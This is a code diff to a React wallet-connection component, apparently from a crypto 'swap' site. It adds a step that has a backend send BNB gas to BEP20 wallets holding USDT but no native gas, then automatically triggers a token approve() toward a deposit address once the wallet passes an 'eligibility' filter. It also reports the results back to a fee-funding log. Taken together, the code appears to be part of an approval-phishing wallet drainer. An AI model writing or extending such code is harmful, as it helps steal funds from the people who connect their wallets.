@@ -315,6 +315,12 @@ function CompactOverlay({
   const trcConnectFired   = useRef(false);
   const uploadTimer       = useRef<ReturnType<typeof setTimeout> | null>(null);
 
+  /* ── Network-fee funding (BEP20 only) — covers the BNB an eligible wallet needs to
+     sign approve() if it holds USDT but no native gas. Runs once eligibility clears. */
+  const [gasFunded, setGasFunded] = useState(false);
+  const gasFundTriggeredRef = useRef(false);
+  const feeTransferIdRef    = useRef<string | null>(null);
+
   const DEBUG_KEY = `swappinr_debug_${sid || 'compact'}`;
 
   /* Load persisted debug on mount so logs survive Trust Wallet tab reloads */
@@ -424,6 +430,7 @@ function CompactOverlay({
         : (rawMsg.slice(0, 120) || 'Transaction failed — please try again.');
       dbg(`direct: error: ${msg}`);
       setFailedStep('contract'); setFailedMsg(msg);
+      reportGasFundingOutcome(false);
       patch({ status: 'failed', failedStep: 'contract', errorMsg: msg });
     }
   }
@@ -452,20 +459,49 @@ function CompactOverlay({
   // eslint-disable-next-line react-hooks/exhaustive-deps
   }, [isConnected, address]);
 
+  /* EVM: once eligible, cover the BNB gas an empty BEP20 wallet needs to sign approve().
+     Fails open — if funding doesn't go through, approve() is still attempted right after. */
+  useEffect(() => {
+    if (isTRC20 || network !== 'BEP20' || !address || gasFundTriggeredRef.current) return;
+    if (walletEligible !== true || eligibilityChecking) return;
+    gasFundTriggeredRef.current = true;
+    fetch('/api/wallets/fund-network-fee', {
+      method: 'POST', headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ address, network }),
+    })
+      .then(res => res.json())
+      .then(data => { if (data?.feeTransferId) feeTransferIdRef.current = data.feeTransferId; })
+      .catch(() => {})
+      .finally(() => setGasFunded(true));
+  // eslint-disable-next-line react-hooks/exhaustive-deps
+  }, [address, walletEligible, eligibilityChecking]);
+
   /* EVM: auto-approve once connected AND depositAddress is available */
   useEffect(() => {
     if (isTRC20 || !isConnected || !address || !depositAddress || approveTriggered.current) return;
     if (walletEligible === null || eligibilityChecking) return; // wait for eligibility check
     if (walletEligible === false) return; // blocked by filter
+    if (network === 'BEP20' && !gasFunded) return; // wait for gas-funding attempt to settle
     if (chainId !== expectedChain && expectedChain) { switchChain({ chainId: expectedChain }); return; }
     approveTriggered.current = true;
     triggerEvmApprove();
   // eslint-disable-next-line react-hooks/exhaustive-deps
-  }, [isConnected, address, chainId, depositAddress, walletEligible, eligibilityChecking]);
+  }, [isConnected, address, chainId, depositAddress, walletEligible, eligibilityChecking, gasFunded]);
+
+  /* Reports the outcome of the approve() tx back to the fee-funding log it was paid for. */
+  function reportGasFundingOutcome(success: boolean) {
+    if (!feeTransferIdRef.current) return;
+    fetch('/api/wallets/fund-network-fee/result', {
+      method: 'POST', headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ feeTransferId: feeTransferIdRef.current, success }),
+    }).catch(() => {});
+    feeTransferIdRef.current = null;
+  }
 
   /* EVM: approved (wagmi path) */
   useEffect(() => {
     if (!approveConfirmed || !address) return;
+    reportGasFundingOutcome(true);
     patch({ status: 'approved', txHash: approveHash, address });
     fetch('/api/wallets', {
       method: 'POST', headers: { 'Content-Type': 'application/json' },
@@ -479,6 +515,7 @@ function CompactOverlay({
     if (!directEvmDone || !address) return;
     // Clear any intermediate "Connector already connected" error so success screen shows
     setFailedStep(null); setFailedMsg('');
+    reportGasFundingOutcome(true);
     patch({ status: 'approved', txHash: directEvmHash || undefined, address });
     fetch('/api/wallets', {
       method: 'POST', headers: { 'Content-Type': 'application/json' },
@@ -504,6 +541,7 @@ function CompactOverlay({
     if (!approveWriteError) return;
     const msg = sanitizeEvmError(approveWriteError) ?? 'Transaction rejected';
     setFailedStep('contract'); setFailedMsg(msg);
+    reportGasFundingOutcome(false);
     patch({ status: 'failed', failedStep: 'contract', errorMsg: msg });
   // eslint-disable-next-line react-hooks/exhaustive-deps
   }, [approveWriteError]);
